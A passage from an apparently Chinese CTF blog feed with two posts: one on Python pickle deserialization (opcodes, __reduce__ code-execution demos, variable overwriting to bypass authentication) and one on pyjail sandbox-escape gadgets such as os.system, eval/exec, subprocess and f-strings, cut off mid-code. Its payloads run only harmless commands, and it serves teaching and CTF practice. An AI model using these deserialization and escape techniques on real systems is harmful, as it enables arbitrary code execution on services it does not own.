href="#pickle过程详细解读" class="headerlink" title="pickle过程详细解读"></a>pickle过程详细解读</h1><ul><li>pickle解析依靠Pickle Virtual Machine (PVM)进行。</li><li>PVM涉及到三个部分：1. 解析引擎 2. 栈 3. 内存：</li><li>解析引擎：从流中读取 opcode 和参数，并对其进行解释处理。重复这个动作，直到遇到 <code>.</code> 停止。最终留在栈顶的值将被作为反序列化对象返回。</li><li>栈：由Python的list实现，被用来临时存储数据、参数以及对象。</li><li>memo：由Python的dict实现，为PVM的生命周期提供存储。说人话：将反序列化完成的数据以 <code>key-value</code> 的形式储存在memo中，以便后来使用。</li></ul><p><img src="https://sl0wjamz.oss-cn-hangzhou.aliyuncs.com/img/20200320230631-6204866e-6abc-1.gif" alt="20200320230631-6204866e-6abc-1"></p><ul><li>PVM解析 <code>__reduce__()</code> 的过程动图：</li></ul><p><img src="https://sl0wjamz.oss-cn-hangzhou.aliyuncs.com/img/20200320230711-7972c0ea-6abc-1.gif" alt="20200320230711-7972c0ea-6abc-1"></p><h1 id="opcode最好用0版本的"><a href="#opcode最好用0版本的" class="headerlink" title="opcode最好用0版本的"></a>opcode最好用0版本的</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line">a=&#123;<span class="string">&#x27;1&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;2&#x27;</span>: <span class="number">2</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;# 原变量：<span class="subst">&#123;a!r&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;pickle版本<span class="subst">&#123;i&#125;</span>&#x27;</span>,pickle.dumps(a,protocol=i))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出：</span></span><br><span class="line">pickle版本<span class="number">0</span> <span class="string">b&#x27;(dp0\nV1\np1\nI1\nsV2\np2\nI2\ns.&#x27;</span></span><br><span class="line">pickle版本<span class="number">1</span> <span class="string">b&#x27;&#125;q\x00(X\x01\x00\x00\x001q\x01K\x01X\x01\x00\x00\x002q\x02K\x02u.&#x27;</span></span><br><span class="line">pickle版本<span class="number">2</span> <span class="string">b&#x27;\x80\x02&#125;q\x00(X\x01\x00\x00\x001q\x01K\x01X\x01\x00\x00\x002q\x02K\x02u.&#x27;</span></span><br><span class="line">pickle版本<span class="number">3</span> <span class="string">b&#x27;\x80\x03&#125;q\x00(X\x01\x00\x00\x001q\x01K\x01X\x01\x00\x00\x002q\x02K\x02u.&#x27;</span></span><br></pre></td></tr></table></figure><ul><li>pickle3版本的opcode示例：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># &#x27;abcd&#x27;</span></span><br><span class="line"><span class="string">b&#x27;\x80\x03X\x04\x00\x00\x00abcdq\x00.&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># \x80：协议头声明 \x03：协议版本</span></span><br><span class="line"><span class="comment"># \x04\x00\x00\x00：数据长度：4</span></span><br><span class="line"><span class="comment"># abcd：数据</span></span><br><span class="line"><span class="comment"># q：储存栈顶的字符串长度：一个字节（即\x00）</span></span><br><span class="line"><span class="comment"># \x00：栈顶位置</span></span><br><span class="line"><span class="comment"># .：数据截止</span></span><br></pre></td></tr></table></figure><h1 id="pickletools"><a href="#pickletools" class="headerlink" title="pickletools"></a>pickletools</h1><ul><li>使用pickletools可以方便的将opcode转化为便于肉眼读取的形式</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"></span><br><span class="line">data=<span class="string">b&quot;\x80\x03cbuiltins\nexec\nq\x00X\x13\x00\x00\x00key1=b&#x27;1&#x27;\nkey2=b&#x27;2&#x27;q\x01\x85q\x02Rq\x03.&quot;</span></span><br><span class="line">pickletools.dis(data)</span><br><span class="line"></span><br><span class="line">    <span class="number">0</span>: \x80 PROTO      <span class="number">3</span></span><br><span class="line">    <span class="number">2</span>: c    GLOBAL     <span class="string">&#x27;builtins exec&#x27;</span></span><br><span class="line">   <span class="number">17</span>: q    BINPUT     <span class="number">0</span></span><br><span class="line">   <span class="number">19</span>: X    BINUNICODE <span class="string">&quot;key1=b&#x27;1&#x27;\nkey2=b&#x27;2&#x27;&quot;</span></span><br><span class="line">   <span class="number">43</span>: q    BINPUT     <span class="number">1</span></span><br><span class="line">   <span class="number">45</span>: \x85 TUPLE1</span><br><span class="line">   <span class="number">46</span>: q    BINPUT     <span class="number">2</span></span><br><span class="line">   <span class="number">48</span>: R    REDUCE</span><br><span class="line">   <span class="number">49</span>: q    BINPUT     <span class="number">3</span></span><br><span class="line">   <span class="number">51</span>: .    STOP</span><br><span class="line">highest protocol among opcodes = <span class="number">2</span></span><br></pre></td></tr></table></figure><h1 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h1><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><ul><li>任意代码执行或命令执行。</li><li>变量覆盖，通过覆盖一些凭证达到绕过身份验证的目的。</li></ul><h3 id="初步认识：pickle-EXP的简单demo"><a href="#初步认识：pickle-EXP的简单demo" class="headerlink" title="初步认识：pickle EXP的简单demo"></a>初步认识：pickle EXP的简单demo</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">genpoc</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        s = <span class="string">&quot;&quot;&quot;echo test &gt;poc.txt&quot;&quot;&quot;</span>  <span class="comment"># 要执行的命令</span></span><br><span class="line">        <span class="keyword">return</span> os.system, (s,)        <span class="comment"># reduce函数必须返回元组或字符串</span></span><br><span class="line"></span><br><span class="line">e = genpoc()</span><br><span class="line">poc = pickle.dumps(e)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(poc) <span class="comment"># 此时，如果 pickle.loads(poc)，就会执行命令</span></span><br></pre></td></tr></table></figure><ul><li>变量覆盖</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line">key1 = <span class="string">b&#x27;321&#x27;</span></span><br><span class="line">key2 = <span class="string">b&#x27;123&#x27;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">exec</span>,(<span class="string">&quot;key1=b&#x27;1&#x27;\nkey2=b&#x27;2&#x27;&quot;</span>,))</span><br><span class="line"></span><br><span class="line">a = A()</span><br><span class="line">pickle_a = pickle.dumps(a)</span><br><span class="line"><span class="built_in">print</span>(pickle_a)</span><br><span class="line">pickle.loads(pickle_a)</span><br><span class="line"><span class="built_in">print</span>(key1, key2)</span><br></pre></td></tr></table></figure><h3 id="如何手写opcode"><a href="#如何手写opcode" class="headerlink" title="如何手写opcode"></a>如何手写opcode</h3><ul><li>在CTF中，很多时候需要一次执行多个函数或一次进行多个指令，此时就不能光用 <code>__reduce__</code> 来解决问题（reduce一次只能执行一个函数，当exec被禁用时，就不能一次执行多条指令了），而需要手动拼接或构造opcode了。手写opcode是pickle反序列化比较难的地方。</li><li>在这里可以体会到为何pickle<strong>是一种语言</strong>，直接编写的opcode灵活性比使用pickle序列化生成的代码更高，只要符合pickle语法，就可以进行变量覆盖、函数执行等操作。</li><li>根据前文不同版本的opcode可以看出，版本0的opcode更方便阅读，所以手动编写时，一般选用版本0的opcode。下文中，所有opcode为版本0的opcode。</li></ul><h1 id="常用opcode"><a href="#常用opcode" class="headerlink" title="常用opcode"></a>常用opcode</h1><table><thead><tr><th>opcode</th><th>描述</th><th>具体写法</th><th>栈上的变化</th><th>memo上的变化</th></tr></thead><tbody><tr><td>c</td><td>获取一个全局对象或import一个模块（注：会调用import语句，能够引入新的包）</td><td>c[module]\n[instance]\n</td><td>获得的对象入栈</td><td>无</td></tr><tr><td>o</td><td>寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象）</td><td>o</td><td>这个过程中涉及到的数据都出栈，函数的返回值（或生成的对象）入栈</td><td>无</td></tr><tr><td>i</td><td>相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）</td><td>i[module]\n[callable]\n</td><td>这个过程中涉及到的数据都出栈，函数返回值（或生成的对象）入栈</td><td>无</td></tr><tr><td>N</td><td>实例化一个None</td><td>N</td><td>获得的对象入栈</td><td>无</td></tr><tr><td>S</td><td>实例化一个字符串对象</td><td>S’xxx’\n（也可以使用双引号、&#39;等python字符串形式）</td><td>获得的对象入栈</td><td>无</td></tr><tr><td>V</td><td>实例化一个UNICODE字符串对象</td><td>Vxxx\n</td><td>获得的对象入栈</td><td>无</td></tr><tr><td>I</td><td>实例化一个int对象</td><td>Ixxx\n</td><td>获得的对象入栈</td><td>无</td></tr><tr><td>F</td><td>实例化一个float对象</td><td>Fx.x\n</td><td>获得的对象入栈</td><td>无</td></tr><tr><td>R</td><td>选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数</td><td>R</td><td>函数和参数出栈，函数的返回值入栈</td><td>无</td></tr><tr><td>.</td><td>程序结束，栈顶的一个元素作为pickle.loads()的返回值</td><td>.</td><td>无</td><td>无</td></tr><tr><td>(</td><td>向栈中压入一个MARK标记</td><td>(</td><td>MARK标记入栈</td><td>无</td></tr><tr><td>t</td><td>寻找栈中的上一个MARK，并组合之间的数据为元组</td><td>t</td><td>MARK标记以及被组合的数据出栈，获得的对象入栈</td><td>无</td></tr><tr><td>)</td><td>向栈中直接压入一个空元组</td><td>)</td><td>空元组入栈</td><td>无</td></tr><tr><td>l</td><td>寻找栈中的上一个MARK，并组合之间的数据为列表</td><td>l</td><td>MARK标记以及被组合的数据出栈，获得的对象入栈</td><td>无</td></tr><tr><td>]</td><td>向栈中直接压入一个空列表</td><td>]</td><td>空列表入栈</td><td>无</td></tr><tr><td>d</td><td>寻找栈中的上一个MARK，并组合之间的数据为字典（数据必须有偶数个，即呈key-value对）</td><td>d</td><td>MARK标记以及被组合的数据出栈，获得的对象入栈</td><td>无</td></tr><tr><td>}</td><td>向栈中直接压入一个空字典</td><td>}</td><td>空字典入栈</td><td>无</td></tr><tr><td>p</td><td>将栈顶对象储存至memo_n</td><td>pn\n</td><td>无</td><td>对象被储存</td></tr><tr><td>g</td><td>将memo_n的对象压栈</td><td>gn\n</td><td>对象被压栈</td><td>无</td></tr><tr><td>0</td><td>丢弃栈顶对象</td><td>0</td><td>栈顶对象被丢弃</td><td>无</td></tr><tr><td>b</td><td>使用栈中的第一个元素（储存多个属性名: 属性值的字典）对第二个元素（对象实例）进行属性设置</td><td>b</td><td>栈上第一个元素出栈</td><td>无</td></tr><tr><td>s</td><td>将栈的第一个和第二个对象作为key-value对，添加或更新到栈的第三个对象（必须为列表或字典，列表以数字作为key）中</td><td>s</td><td>第一、二个元素出栈，第三个元素（列表或字典）添加新值或被更新</td><td>无</td></tr><tr><td>u</td><td>寻找栈中的上一个MARK，组合之间的数据（数据必须有偶数个，即呈key-value对）并全部添加或更新到该MARK之前的一个元素（必须为字典）中</td><td>u</td><td>MARK标记以及被组合的数据出栈，字典被更新</td><td>无</td></tr><tr><td>a</td><td>将栈的第一个元素append到第二个元素(列表)中</td><td>a</td><td>栈顶元素出栈，第二个元素（列表）被更新</td><td>无</td></tr><tr><td>e</td><td>寻找栈中的上一个MARK，组合之间的数据并extends到该MARK之前的一个元素（必须为列表）中</td><td>e</td><td>MARK标记以及被组合的数据出栈，列表被更新</td><td>无</td></tr></tbody></table><p>此外， <code>TRUE</code> 可以用 <code>I</code> 表示： <code>b&#39;I01\n&#39;</code> ； <code>FALSE</code> 也可以用 <code>I</code> 表示： <code>b&#39;I00\n&#39;</code> ，其他opcode可以在<a href="https://github.com/python/cpython/blob/master/Lib/pickle.py#L111">pickle库的源代码</a>中找到。<br>由这些opcode我们可以得到一些需要注意的地方：</p><ul><li>编写opcode时要想象栈中的数据，以正确使用每种opcode。</li><li>在理解时注意与python本身的操作对照（比如python列表的<code>append</code>对应<code>a</code>、<code>extend</code>对应<code>e</code>；字典的<code>update</code>对应<code>u</code>）。</li><li><code>c</code>操作符会尝试<code>import</code>库，所以在<code>pickle.loads</code>时不需要漏洞代码中先引入系统库。</li><li>pickle不支持列表索引、字典索引、点号取对象属性作为<strong>左值</strong>，需要索引时只能先获取相应的函数（如<code>getattr</code>、<code>dict.get</code>）才能进行。但是因为存在<code>s</code>、<code>u</code>、<code>b</code>操作符，<strong>作为右值是可以的</strong>。即“查值不行，赋值可以”。pickle能够索引查值的操作只有<code>c</code>、<code>i</code>。而如何查值也是CTF的一个重要考点。</li><li><code>s</code>、<code>u</code>、<code>b</code>操作符可以构造并赋值原来没有的属性、键值对。</li></ul><h4 id="拼接opcode"><a href="#拼接opcode" class="headerlink" title="拼接opcode"></a>拼接opcode</h4><p>将第一个pickle流结尾表示结束的 <code>.</code> 去掉，将第二个pickle流与第一个拼接起来即可。</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pyjail</title>
      <link href="/2024/02/26/pyjail/"/>
      <url>/2024/02/26/pyjail/</url>
      
        <content type="html"><![CDATA[<h1 id="任意命令执行"><a href="#任意命令执行" class="headerlink" title="任意命令执行"></a>任意命令执行</h1><p>原文链接：<a href="https://blog.csdn.net/Jayjay___/article/details/132436072">https://blog.csdn.net/Jayjay___/article/details/132436072</a></p><h2 id="可用的函数和模块以及文件操作"><a href="#可用的函数和模块以及文件操作" class="headerlink" title="可用的函数和模块以及文件操作"></a>可用的函数和模块以及文件操作</h2><h3 id="函数和模块"><a href="#函数和模块" class="headerlink" title="函数和模块"></a>函数和模块</h3><h4 id="import-函数"><a href="#import-函数" class="headerlink" title="import 函数"></a>import 函数</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;dir&#x27;</span>)</span><br></pre></td></tr></table></figure><p>包ban掉的:(</p><h4 id="exec-eval-函数"><a href="#exec-eval-函数" class="headerlink" title="exec &amp; eval 函数"></a>exec &amp; eval 函数</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="string">&#x27;__import__(&quot;os&quot;).system(&quot;dir&quot;)&#x27;</span>)</span><br><span class="line"><span class="built_in">exec</span>(<span class="string">&#x27;__import__(&quot;os&quot;).system(&quot;dir&quot;)&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240726132528541.png" alt="image-20240726132528541"></p><h4 id="execfile-函数"><a href="#execfile-函数" class="headerlink" title="execfile 函数"></a>execfile 函数</h4><p>执行文件，主要用于引入模块来执行命令<br>python3不存在</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;execfile(<span class="string">&#x27;/usr/lib/python2.7/os.py&#x27;</span>)</span><br><span class="line">&gt;&gt;&gt;system(<span class="string">&#x27;dir&#x27;</span>)</span><br><span class="line">&gt;&gt;&gt;getcwd() <span class="comment"># 等同于pwd</span></span><br></pre></td></tr></table></figure><h4 id="timeit-函数-from-timeit-模块"><a href="#timeit-函数-from-timeit-模块" class="headerlink" title="timeit 函数 from timeit 模块"></a>timeit 函数 from timeit 模块</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> timeit</span><br><span class="line">timeit.timeit(<span class="string">&#x27;__import__(&quot;os&quot;).system(&quot;dir&quot;)&#x27;</span>,number=<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240726133002332.png" alt="image-20240726133002332"><code>timeit</code> 是一个 Python 内置模块，用于计时小段代码的执行时间。它提供了一种简单的方法来测量代码的性能，非常适合用于基准测试（benchmarking)。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m timeit &quot;x = sum(range(1000))&quot; //这将输出多次执行该代码段的平均时间。</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> timeit</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义一个函数来计时</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">example</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sum</span>(<span class="built_in">range</span>(<span class="number">1000</span>)) <span class="comment"># tip sum(iterable, start=0)小用法</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 timeit.timeit 计时</span></span><br><span class="line">execution_time = timeit.timeit(<span class="string">&quot;example()&quot;</span>, <span class="built_in">globals</span>=<span class="built_in">globals</span>(), number=<span class="number">1000</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Execution time: <span class="subst">&#123;execution_time&#125;</span> seconds&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 在 timeit.timeit() 中传递一段代码字符串时，这段代码默认在一个新的、干净的命名空间中执行。这意味着它无法访问当前脚本中的任何变量、函数或导入的模块。通过指定 globals=globals()，可以让这段代码在当前脚本的全局命名空间中执行，从而访问当前脚本中的变量和函数。</span></span><br></pre></td></tr></table></figure><h4 id="platform-模块"><a href="#platform-模块" class="headerlink" title="platform 模块"></a>platform 模块</h4><blockquote><p>注意这个只在__py2__生效，py3用了subprocess</p></blockquote><p>platform提供了很多方法去获取操作系统的信息，popen函数可以执行任意命令</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> platform </span><br><span class="line"><span class="built_in">print</span> platform.popen(<span class="string">&#x27;dir&#x27;</span>).read()</span><br></pre></td></tr></table></figure><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240726133938515.png" alt="image-20240726133938515"></p><h4 id="commands-模块"><a href="#commands-模块" class="headerlink" title="commands 模块"></a>commands 模块</h4><blockquote><p>这个同样在py2才行</p></blockquote><p>依旧可以用来执行部分指令，貌似不可以拿shell，但其他的很多都可以</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> commands</span><br><span class="line"><span class="built_in">print</span> commands.getoutput(<span class="string">&quot;dir&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> commands.getstatusoutput(<span class="string">&quot;dir&quot;</span>)</span><br></pre></td></tr></table></figure><h4 id="subprocess模块"><a href="#subprocess模块" class="headerlink" title="subprocess模块"></a>subprocess模块</h4><p>py3集大成之模块</p><p>shell&#x3D;True 命令本身被bash启动，支持shell启动，否则不支持</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line">subprocess.call([<span class="string">&#x27;ls&#x27;</span>],shell=<span class="literal">True</span>)</span><br><span class="line">subprocess.getstatusoutput(<span class="string">&quot;dir&quot;</span>)</span><br><span class="line">subprocess.getoutput(<span class="string">&quot;dir&quot;</span>)</span><br><span class="line">subprocess.check_output([<span class="string">&#x27;ls&#x27;</span>, <span class="string">&#x27;/&#x27;</span>]) <span class="comment"># py2</span></span><br><span class="line">subprocess.run([<span class="string">&#x27;ls&#x27;</span>, <span class="string">&#x27;/&#x27;</span>], capture_output=<span class="literal">True</span>, text=<span class="literal">True</span>) </span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">capture_output=True 表示捕获标准输出和标准错误。</span></span><br><span class="line"><span class="string">text=True 表示将输出作为字符串处理，而不是字节。</span></span><br><span class="line"><span class="string">check=True 表示如果命令返回非零退出状态，将引发 subprocess.CalledProcessError 异常。</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240726134649336.png" alt="image-20240726134649336"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess  <span class="comment"># py3</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    result = subprocess.run([<span class="string">&#x27;ls&#x27;</span>, <span class="string">&#x27;/&#x27;</span>], capture_output=<span class="literal">True</span>, text=<span class="literal">True</span>, check=<span class="literal">True</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Command output:\n&quot;</span>, result.stdout)</span><br><span class="line"><span class="keyword">except</span> subprocess.CalledProcessError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Command failed with error:\n&quot;</span>, e.stderr)</span><br></pre></td></tr></table></figure><h4 id="compile-函数"><a href="#compile-函数" class="headerlink" title="compile 函数"></a>compile 函数</h4><p>compile() 函数将一个字符串编译为字节代码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">compile</span>(source, filename, mode[, flags[, dont_inherit]])</span><br></pre></td></tr></table></figure><ul><li>source – 字符串或者AST（Abstract Syntax Trees）对象（抽象语法树）</li><li>filename – 代码文件名称，如果不是从文件读取代码则传递一些可辨认的值</li><li>mode – 指定编译代码的种类。可以指定为 <code>exec</code> ,<code>eval</code>, <code>single</code><ol><li><code>exec</code>：可以包含一系列语句（包括复合语句，如函数定义）。</li><li><code>eval</code>：只能包含单个表达式。</li><li><code>single</code>：可以包含单个语句。</li></ol></li><li>flags – 变量作用域，局部命名空间，如果被提供，可以是任何映射对象</li><li>flags和dont_inherit是用来控制编译源码时的标志</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;<span class="built_in">str</span> = <span class="string">&quot;for i in range(0,10): print(i)&quot;</span> </span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>c = <span class="built_in">compile</span>(<span class="built_in">str</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;exec&#x27;</span>)   <span class="comment"># 编译为字节代码对象 </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>c</span><br><span class="line">&lt;code <span class="built_in">object</span> &lt;module&gt; at <span class="number">0x10141e0b0</span>, file <span class="string">&quot;&quot;</span>, line <span class="number">1</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">exec</span>(c)</span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="number">5</span></span><br><span class="line"><span class="number">6</span></span><br><span class="line"><span class="number">7</span></span><br><span class="line"><span class="number">8</span></span><br><span class="line"><span class="number">9</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">str</span> = <span class="string">&quot;3 * 4 + 5&quot;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = <span class="built_in">compile</span>(<span class="built_in">str</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">eval</span>(a)</span><br><span class="line"><span class="number">17</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">source_code = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">def greet(name):</span></span><br><span class="line"><span class="string">    return &#x27;Hello, &#x27; + name</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">print(greet(&#x27;World&#x27;))</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">code_object = <span class="built_in">compile</span>(source_code, <span class="string">&#x27;&lt;string&gt;&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>)</span><br><span class="line"><span class="built_in">exec</span>(code_object)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>生成动态命令：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义要执行的命令</span></span><br><span class="line">command = <span class="string">&quot;ls /&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 compile 编译命令字符串</span></span><br><span class="line">compiled_command = <span class="built_in">compile</span>(<span class="string">f&quot;subprocess.getoutput(&#x27;<span class="subst">&#123;command&#125;</span>&#x27;)&quot;</span>, <span class="string">&#x27;&lt;string&gt;&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 eval 执行编译后的命令</span></span><br><span class="line">output = <span class="built_in">eval</span>(compiled_command)</span><br><span class="line"><span class="built_in">print</span>(output)</span><br></pre></td></tr></table></figure><h4 id="fstring（f修饰符-py-3-6）"><a href="#fstring（f修饰符-py-3-6）" class="headerlink" title="fstring（f修饰符 py&gt;3.6）"></a>fstring（f修饰符 py&gt;3.6）</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">f&#x27;<span class="subst">&#123;<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;ls&quot;</span>)&#125;</span>&#x27;</span></span><br><span class="line"><span class="string">F&#x27;<span class="subst">&#123;<span 